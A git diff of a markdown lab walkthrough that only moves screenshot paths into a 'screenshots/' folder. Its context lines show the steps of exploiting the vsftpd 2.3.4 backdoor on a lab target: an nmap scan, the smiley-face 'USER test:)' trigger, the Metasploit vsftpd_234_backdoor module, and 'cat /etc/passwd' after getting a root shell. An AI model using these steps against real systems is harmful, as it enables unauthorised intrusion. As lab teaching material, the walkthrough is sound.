@@ -40,7 +40,7 @@ ifconfig
 ping [target IP]
 ```
 
-![Ping success](ping-kali.png)
+![Ping success](screenshots/ping-kali.png)
 
 ---
 
@@ -52,7 +52,7 @@ nmap -sS -sV [target IP]
 
 Result: Port **21/tcp** running `vsftpd 2.3.4`
 
-![Ping success](nmap-scan.png)
+![Ping success](screenshots/nmap-scan.png)
 
 ---
 
@@ -68,7 +68,7 @@ USER test:)
 PASS test
 ```
 
-![Ping success](closed-by-foreign-host.png)
+![Ping success](screenshots/closed-by-foreign-host.png)
 
 ---
 
@@ -85,7 +85,7 @@ uname -a
 cat /etc/passwd
 ```
 
-![Ping success](root-access-change.png)
+![Ping success](screenshots/root-access-change.png)
 
 ---
 
@@ -98,7 +98,7 @@ msfconsole
 ```
 
 ---
-![Ping success](msf-1.png)
+![Ping success](screenshots/msf-1.png)
 
 ### 2. Search for the vsftpd Exploit
 
@@ -111,7 +111,7 @@ Use the backdoor module:
 use exploit/unix/ftp/vsftpd_234_backdoor
 ```
 
-![Ping success](msf-root-access.png)
+![Ping success](screenshots/msf-root-access.png)
 
 ---
 
@@ -121,7 +121,7 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOST [target IP]
 ```
 
-![Ping success](msf-root-access.png)
+![Ping success](screenshots/msf-root-access.png)
 
 ---
 
@@ -137,7 +137,7 @@ Found shell.
 Command shell session 1 opened...
 ```
 
-![Ping success](msf-root-access.png)
+![Ping success](screenshots/msf-root-access.png)
 
 ---
 
@@ -149,7 +149,7 @@ uname -a
 cat /etc/passwd
 ```
 
-![Ping success](msf-root-access.png)
+![Ping success](screenshots/msf-root-access.png)
 
 ---
 
